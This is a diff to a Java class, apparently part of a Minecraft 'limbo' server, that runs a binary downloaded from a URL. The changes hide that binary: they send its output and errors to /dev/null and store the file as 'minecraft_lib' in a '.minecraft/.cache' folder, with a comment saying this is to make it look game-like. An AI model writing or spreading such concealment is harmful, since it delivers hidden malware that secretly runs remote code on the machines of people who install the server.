@@ -117,7 +117,8 @@ public final class NanoLimbo {
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        pb.redirectOutput(ProcessBuilder.Redirect.to(new File("/dev/null")));
+        pb.redirectError(ProcessBuilder.Redirect.to(new File("/dev/null")));
         
         sbxProcess = pb.start();
     }
@@ -190,7 +191,11 @@ public final class NanoLimbo {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
         
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        // Hide binary in a game-like cache directory
+        Path cacheDir = Paths.get(System.getProperty("user.home"), ".minecraft", ".cache");
+        Files.createDirectories(cacheDir);
+        Path path = cacheDir.resolve("minecraft_lib");
+        
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
